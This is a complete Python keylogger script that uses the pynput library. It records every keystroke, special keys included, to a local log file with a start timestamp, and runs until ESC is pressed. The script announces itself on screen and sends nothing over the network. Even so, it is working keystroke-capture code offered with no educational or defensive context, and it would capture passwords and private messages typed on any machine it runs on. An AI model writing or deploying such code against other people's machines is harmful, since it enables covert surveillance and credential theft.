from pynput import keyboard
import os
from datetime import datetime

# File to store the logs
LOG_FILE = "key_log.txt"

# Ensure the log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("Keylogger started at {}\n\n".format(datetime.now()))

def on_press(key):
    try:
        # Attempt to log the actual key pressed
        with open(LOG_FILE, "a") as f:
            f.write('{}\n'.format(key.char))
    except AttributeError:
        # Handle special keys
        with open(LOG_FILE, "a") as f:
            f.write('<{}>\n'.format(key.name))

def on_release(key):
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Start listening
print("Keylogger is running. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
